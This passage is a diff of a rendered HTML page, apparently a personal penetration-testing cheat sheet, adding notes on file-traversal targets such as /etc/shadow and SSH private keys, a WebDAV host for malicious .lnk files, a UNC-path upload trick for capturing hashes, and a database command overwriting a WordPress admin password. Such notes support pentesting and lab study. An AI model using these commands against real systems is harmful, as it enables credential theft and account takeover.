+</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a>/etc/passwd
+</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a>/etc/shadow
+</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a>/proc/self/environ
+</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6" href="#__codelineno-72-6"></a>/var/www/html/webdav/passwd.dav
+</span><span id="__span-72-7"><a id="__codelineno-72-7" name="__codelineno-72-7" href="#__codelineno-72-7"></a>
+</span><span id="__span-72-8"><a id="__codelineno-72-8" name="__codelineno-72-8" href="#__codelineno-72-8"></a><span class="c1"># SSH key handling</span>
+</span><span id="__span-72-9"><a id="__codelineno-72-9" name="__codelineno-72-9" href="#__codelineno-72-9"></a>../.ssh/id_rsa
+</span><span id="__span-72-10"><a id="__codelineno-72-10" name="__codelineno-72-10" href="#__codelineno-72-10"></a>chmod<span class="w"> </span><span class="m">400</span><span class="w"> </span>id_rsa
+</span><span id="__span-72-11"><a id="__codelineno-72-11" name="__codelineno-72-11" href="#__codelineno-72-11"></a>sudo<span class="w"> </span>-l
+</span><span id="__span-72-12"><a id="__codelineno-72-12" name="__codelineno-72-12" href="#__codelineno-72-12"></a>
+</span><span id="__span-72-13"><a id="__codelineno-72-13" name="__codelineno-72-13" href="#__codelineno-72-13"></a>
+</span><span id="__span-72-14"><a id="__codelineno-72-14" name="__codelineno-72-14" href="#__codelineno-72-14"></a>
+</span><span id="__span-72-15"><a id="__codelineno-72-15" name="__codelineno-72-15" href="#__codelineno-72-15"></a><span class="c1"># Directory traversal / local file inclusion Windows</span>
+</span><span id="__span-72-16"><a id="__codelineno-72-16" name="__codelineno-72-16" href="#__codelineno-72-16"></a><span class="c1"># https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal</span>
+</span><span id="__span-72-17"><a id="__codelineno-72-17" name="__codelineno-72-17" href="#__codelineno-72-17"></a>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\d</span>rivers<span class="se">\e</span>tc<span class="se">\h</span>osts
+</span><span id="__span-72-18"><a id="__codelineno-72-18" name="__codelineno-72-18" href="#__codelineno-72-18"></a><span class="c1"># IIS web server files/folders</span>
+</span><span id="__span-72-19"><a id="__codelineno-72-19" name="__codelineno-72-19" href="#__codelineno-72-19"></a>C:<span class="se">\i</span>netpub<span class="se">\l</span>ogs<span class="se">\L</span>ogFiles<span class="se">\W</span>3SVC1<span class="se">\</span>
+</span><span id="__span-72-20"><a id="__codelineno-72-20" name="__codelineno-72-20" href="#__codelineno-72-20"></a>C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot<span class="se">\w</span>eb.config
+</span><span id="__span-72-21"><a id="__codelineno-72-21" name="__codelineno-72-21" href="#__codelineno-72-21"></a><span class="c1"># XAMPP PHP</span>
+</span><span id="__span-72-22"><a id="__codelineno-72-22" name="__codelineno-72-22" href="#__codelineno-72-22"></a>C:<span class="se">\x</span>ampp<span class="se">\a</span>pache<span class="se">\l</span>ogs
+</span><span id="__span-72-23"><a id="__codelineno-72-23" name="__codelineno-72-23" href="#__codelineno-72-23"></a><span class="c1"># SSH</span>
+</span><span id="__span-72-24"><a id="__codelineno-72-24" name="__codelineno-72-24" href="#__codelineno-72-24"></a>C:<span class="se">\U</span>sers<span class="se">\U</span>SER<span class="se">\.</span>ssh<span class="se">\i</span>d_rsa
+</span><span id="__span-72-25"><a id="__codelineno-72-25" name="__codelineno-72-25" href="#__codelineno-72-25"></a>
+</span><span id="__span-72-26"><a id="__codelineno-72-26" name="__codelineno-72-26" href="#__codelineno-72-26"></a><span class="c1"># Decode Base64</span>
+</span><span id="__span-72-27"><a id="__codelineno-72-27" name="__codelineno-72-27" href="#__codelineno-72-27"></a><span class="nb">echo</span><span class="w"> </span>&lt;base64&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
+</span><span id="__span-72-28"><a id="__codelineno-72-28" name="__codelineno-72-28" href="#__codelineno-72-28"></a><span class="c1"># Inspect file in binary</span>
+</span><span id="__span-72-29"><a id="__codelineno-72-29" name="__codelineno-72-29" href="#__codelineno-72-29"></a>xxd<span class="w"> </span>-b<span class="w"> </span>malware.txt
+</span><span id="__span-72-30"><a id="__codelineno-72-30" name="__codelineno-72-30" href="#__codelineno-72-30"></a>
+</span><span id="__span-72-31"><a id="__codelineno-72-31" name="__codelineno-72-31" href="#__codelineno-72-31"></a><span class="c1"># Test whether running in CMD or PS</span>
+</span><span id="__span-72-32"><a id="__codelineno-72-32" name="__codelineno-72-32" href="#__codelineno-72-32"></a><span class="o">(</span>dir<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span>*<span class="sb">`</span><span class="p">|</span><span class="nb">echo</span><span class="w"> </span>CMD<span class="o">)</span><span class="p">;&amp;</span>&lt;<span class="c1"># rem #&gt;echo PowerShell</span>
+</span><span id="__span-72-33"><a id="__codelineno-72-33" name="__codelineno-72-33" href="#__codelineno-72-33"></a><span class="c1"># Escaping for formatting</span>
+</span><span id="__span-72-34"><a id="__codelineno-72-34" name="__codelineno-72-34" href="#__codelineno-72-34"></a><span class="sb">`</span>
+</span><span id="__span-72-35"><a id="__codelineno-72-35" name="__codelineno-72-35" href="#__codelineno-72-35"></a>
+</span><span id="__span-72-36"><a id="__codelineno-72-36" name="__codelineno-72-36" href="#__codelineno-72-36"></a><span class="c1"># Exiftool, display duplicated and unknown tags</span>
+</span><span id="__span-72-37"><a id="__codelineno-72-37" name="__codelineno-72-37" href="#__codelineno-72-37"></a>exiftool<span class="w"> </span>-a<span class="w"> </span>-u<span class="w"> </span>document.pdf
+</span><span id="__span-72-38"><a id="__codelineno-72-38" name="__codelineno-72-38" href="#__codelineno-72-38"></a>
+</span><span id="__span-72-39"><a id="__codelineno-72-39" name="__codelineno-72-39" href="#__codelineno-72-39"></a><span class="c1"># Quickly scan files for content</span>
+</span><span id="__span-72-40"><a id="__codelineno-72-40" name="__codelineno-72-40" href="#__codelineno-72-40"></a>find<span class="w"> </span>.<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-name<span class="w"> </span><span class="s2">"FILENAME_HINT"</span><span class="w"> </span>-exec<span class="w"> </span>grep<span class="w"> </span>-niH<span class="w"> </span><span class="s2">"TERM"</span><span class="w"> </span><span class="o">{}</span><span class="w"> </span>+
+</span><span id="__span-72-41"><a id="__codelineno-72-41" name="__codelineno-72-41" href="#__codelineno-72-41"></a>
+</span><span id="__span-72-42"><a id="__codelineno-72-42" name="__codelineno-72-42" href="#__codelineno-72-42"></a><span class="c1"># Python2 env</span>
+</span><span id="__span-72-43"><a id="__codelineno-72-43" name="__codelineno-72-43" href="#__codelineno-72-43"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>virtualenv<span class="w"> </span>python2<span class="w"> </span>python2-dev
+</span><span id="__span-72-44"><a id="__codelineno-72-44" name="__codelineno-72-44" href="#__codelineno-72-44"></a>curl<span class="w"> </span>https://bootstrap.pypa.io/pip/2.7/get-pip.py<span class="w"> </span>-o<span class="w"> </span>get-pip.py
+</span><span id="__span-72-45"><a id="__codelineno-72-45" name="__codelineno-72-45" href="#__codelineno-72-45"></a>sudo<span class="w"> </span>python2<span class="w"> </span>get-pip.py<span class="w">  </span>
+</span><span id="__span-72-46"><a id="__codelineno-72-46" name="__codelineno-72-46" href="#__codelineno-72-46"></a>pip2<span class="w"> </span>install<span class="w"> </span>virtualenv<span class="w">      </span>
+</span><span id="__span-72-47"><a id="__codelineno-72-47" name="__codelineno-72-47" href="#__codelineno-72-47"></a>python2<span class="w"> </span>-m<span class="w"> </span>virtualenv<span class="w"> </span>py2env<span class="w">  </span>
+</span><span id="__span-72-48"><a id="__codelineno-72-48" name="__codelineno-72-48" href="#__codelineno-72-48"></a><span class="nb">source</span><span class="w"> </span>py2env/bin/activate
+</span><span id="__span-72-49"><a id="__codelineno-72-49" name="__codelineno-72-49" href="#__codelineno-72-49"></a>python<span class="w"> </span>-V
+</span><span id="__span-72-50"><a id="__codelineno-72-50" name="__codelineno-72-50" href="#__codelineno-72-50"></a><span class="c1"># Install impacket for Pyhon2</span>
+</span><span id="__span-72-51"><a id="__codelineno-72-51" name="__codelineno-72-51" href="#__codelineno-72-51"></a>pip<span class="w"> </span>install<span class="w"> </span><span class="nv">impacket</span><span class="o">==</span><span class="m">0</span>.9.22
+</span><span id="__span-72-52"><a id="__codelineno-72-52" name="__codelineno-72-52" href="#__codelineno-72-52"></a><span class="c1"># Python3 env</span>
+</span><span id="__span-72-53"><a id="__codelineno-72-53" name="__codelineno-72-53" href="#__codelineno-72-53"></a>python3<span class="w"> </span>-m<span class="w"> </span>virtualenv<span class="w"> </span>py3env<span class="w">  </span>
+</span><span id="__span-72-54"><a id="__codelineno-72-54" name="__codelineno-72-54" href="#__codelineno-72-54"></a><span class="nb">source</span><span class="w"> </span>py3env/bin/activate
+</span><span id="__span-72-55"><a id="__codelineno-72-55" name="__codelineno-72-55" href="#__codelineno-72-55"></a>
+</span><span id="__span-72-56"><a id="__codelineno-72-56" name="__codelineno-72-56" href="#__codelineno-72-56"></a><span class="c1"># Open webdav folder, for example to host malicious .lnk file</span>
+</span><span id="__span-72-57"><a id="__codelineno-72-57" name="__codelineno-72-57" href="#__codelineno-72-57"></a>wsgidav<span class="w"> </span>--host<span class="o">=</span><span class="m">0</span>.0.0.0<span class="w"> </span>--port<span class="o">=</span><span class="m">80</span><span class="w"> </span>--auth<span class="o">=</span>anonymous<span class="w"> </span>--root<span class="w"> </span>/home/kali/webdav
+</span><span id="__span-72-58"><a id="__codelineno-72-58" name="__codelineno-72-58" href="#__codelineno-72-58"></a>
+</span><span id="__span-72-59"><a id="__codelineno-72-59" name="__codelineno-72-59" href="#__codelineno-72-59"></a><span class="c1"># Proxy Python through Burp</span>
+</span><span id="__span-72-60"><a id="__codelineno-72-60" name="__codelineno-72-60" href="#__codelineno-72-60"></a><span class="c1"># https://www.th3r3p0.com/random/python-requests-and-burp-suite.html</span>
+</span><span id="__span-72-61"><a id="__codelineno-72-61" name="__codelineno-72-61" href="#__codelineno-72-61"></a><span class="nv">proxies</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span><span class="s2">"http"</span>:<span class="w"> </span><span class="s2">"http://127.0.0.1:8080"</span>,<span class="w"> </span><span class="s2">"https"</span>:<span class="w"> </span><span class="s2">"http://127.0.0.1:8080"</span><span class="o">}</span>
+</span><span id="__span-72-62"><a id="__codelineno-72-62" name="__codelineno-72-62" href="#__codelineno-72-62"></a><span class="nv">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>requests.get<span class="o">(</span><span class="s2">"https://www.google.com/"</span>,<span class="w"> </span><span class="nv">proxies</span><span class="o">=</span>proxies,<span class="w"> </span><span class="nv">verify</span><span class="o">=</span>False<span class="o">)</span>
+</span><span id="__span-72-63"><a id="__codelineno-72-63" name="__codelineno-72-63" href="#__codelineno-72-63"></a>
+</span><span id="__span-72-64"><a id="__codelineno-72-64" name="__codelineno-72-64" href="#__codelineno-72-64"></a><span class="c1"># Small sample files for uploads</span>
+</span><span id="__span-72-65"><a id="__codelineno-72-65" name="__codelineno-72-65" href="#__codelineno-72-65"></a>https://github.com/mathiasbynens/small
+</span><span id="__span-72-66"><a id="__codelineno-72-66" name="__codelineno-72-66" href="#__codelineno-72-66"></a>
+</span><span id="__span-72-67"><a id="__codelineno-72-67" name="__codelineno-72-67" href="#__codelineno-72-67"></a><span class="c1"># File upload, collect file elsewhere (UNC path) by changing filename in Burp, e.g. to capture stuff in Responder</span>
+</span><span id="__span-72-68"><a id="__codelineno-72-68" name="__codelineno-72-68" href="#__codelineno-72-68"></a><span class="se">\\\\</span>IP<span class="se">\\</span><span class="nb">test</span>
+</span><span id="__span-72-69"><a id="__codelineno-72-69" name="__codelineno-72-69" href="#__codelineno-72-69"></a>
+</span><span id="__span-72-70"><a id="__codelineno-72-70" name="__codelineno-72-70" href="#__codelineno-72-70"></a><span class="c1"># Wordpress</span>
+</span><span id="__span-72-71"><a id="__codelineno-72-71" name="__codelineno-72-71" href="#__codelineno-72-71"></a><span class="c1"># https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html</span>
+</span><span id="__span-72-72"><a id="__codelineno-72-72" name="__codelineno-72-72" href="#__codelineno-72-72"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://IP<span class="w"> </span>-v<span class="w">  </span>
+</span><span id="__span-72-73"><a id="__codelineno-72-73" name="__codelineno-72-73" href="#__codelineno-72-73"></a><span class="c1"># Replace admin password in database</span>
+</span><span id="__span-72-74"><a id="__codelineno-72-74" name="__codelineno-72-74" href="#__codelineno-72-74"></a>mysql<span class="w"> </span>-u<span class="w"> </span>USER<span class="w"> </span>--password<span class="o">=</span>PASS<span class="w"> </span>-h<span class="w"> </span>localhost<span class="w"> </span>-e<span class="w"> </span><span class="s2">"use wp;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"</span>
+</span><span id="__span-72-75"><a id="__codelineno-72-75" name="__codelineno-72-75" href="#__codelineno-72-75"></a>
+</span><span id="__span-72-76"><a id="__codelineno-72-76" name="__codelineno-72-76" href="#__codelineno-72-76"></a><span class="c1"># Impacket</span>
+</span><span id="__span-72-77"><a id="__codelineno-72-77" name="__codelineno-72-77" href="#__codelineno-72-77"></a><span class="c1"># Change password</span>
+</span><span id="__span-72-78"><a id="__codelineno-72-78" name="__codelineno-72-78" href="#__codelineno-72-78"></a>impacket-changepasswd<span class="w"> </span>USER@DOMAIN<span class="w"> </span>-newpass<span class="w"> </span><span class="s1">'NEWPASSWORD'</span>
 </span></code></pre></div>
 <h3 id="kali-setup">Kali Setup<a class="headerlink" href="#kali-setup" title="Permanent link">¶</a></h3>
 <p>Python2 virtual environment</p>
@@ -4682,8 +4822,8 @@ apt-get install wine32</p>
 <p>Download seclists</p>
 <p>Burp plugin and cert</p>
 <p>Copy /usr/share/shells to Downloads for easy access and backup</p>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="nb">cd</span><span class="w"> </span>/usr/share/wordlists/
-</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>sudo<span class="w"> </span>gzip<span class="w"> </span>-d<span class="w"> </span>rockyou.txt.gz
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="nb">cd</span><span class="w"> </span>/usr/share/wordlists/
+</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>sudo<span class="w"> </span>gzip<span class="w"> </span>-d<span class="w"> </span>rockyou.txt.gz
 </span></code></pre></div>
 
 
@@ -4705,7 +4845,7 @@ apt-get install wine32</p>
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="August 17, 2026 19:07:38 UTC">August 17, 2026</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="September 2, 2026 19:23:42 UTC">September 2, 2026</span>
   </span>
 
     
